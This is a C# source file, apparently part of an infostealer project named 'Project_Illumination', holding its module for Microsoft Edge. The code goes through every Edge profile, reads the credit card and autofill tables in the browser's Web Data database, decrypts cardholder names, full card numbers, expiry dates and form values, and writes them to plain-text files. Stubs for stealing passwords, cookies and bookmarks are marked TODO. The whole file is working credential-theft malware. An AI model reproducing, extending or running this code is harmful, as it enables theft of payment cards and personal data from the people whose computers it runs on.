using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

namespace Project_Illumination.Exploits.Browsers
{
    internal class Edge : IBrowser
    {
        private readonly string _path;
        private readonly List<string> _autoFillData, _paymentInformation;

        public Edge()
        {
            _path = $@"{Paths.SAVE_PATH}\Browsers\Edge";
            _autoFillData = new List<string>();
            _paymentInformation = new List<string>();

            if (!Directory.Exists(Paths.EDGE_BROWSER)) return;

            Directory.CreateDirectory(_path);
        }

        public void Run()
        {
            Parallel.ForEach(Directory.GetDirectories(Paths.EDGE_BROWSER), profile =>
            {
                if (!File.Exists($@"{profile}\Login Data")) return;

                GetAutoFill($@"{profile}\Web Data");
                GetPaymentInformation($@"{profile}\Web Data");
            });

            if (_autoFillData.Count > 0)
                File.WriteAllText($@"{_path}\auto_fill.txt", string.Join("\n", _autoFillData));

            if (_paymentInformation.Count > 0)
                File.WriteAllText($@"{_path}\payment_information.txt", string.Join("\n", _paymentInformation));
        }

        public void GetPaymentInformation(string path)
        {
            var sqlReader = SQLite.ReadTable(path, "credit_cards");
            if (sqlReader == null) return;

            for (var i = 0; i < sqlReader.GetRowCount(); i++)
            {
                var name = Crypto.GetUTF8(Crypto.EasyDecrypt(path, sqlReader.GetValue(i, 1)));
                var number = Crypto.GetUTF8(Crypto.EasyDecrypt(path, sqlReader.GetValue(i, 4)));
                var expirationMonth = Crypto.GetUTF8(Crypto.EasyDecrypt(path, sqlReader.GetValue(i, 2)));
                var expirationYear = Crypto.GetUTF8(Crypto.EasyDecrypt(path, sqlReader.GetValue(i, 3)));
                var expiration = $"{expirationMonth}/{expirationYear}";

                _paymentInformation.Add($@"{name} | {number} | {expiration}");
            }
        }

        public void GetAutoFill(string path)
        {
            var sqlReader = SQLite.ReadTable(path, "autofill");
            if (sqlReader == null) return;

            for (var i = 0; i < sqlReader.GetRowCount(); i++)
            {
                var name = Crypto.GetUTF8(sqlReader.GetValue(i, 1));
                var value = Crypto.GetUTF8(Crypto.EasyDecrypt(path, sqlReader.GetValue(i, 2)));

                _autoFillData.Add($"{name} | {value}");
            }
        }

        // TODO....
        public void GetPasswords(string path)
        {
        }

        public void GetBookmarks(string path)
        {
        }

        public void GetCookies(string path)
        {
        }
    }
}
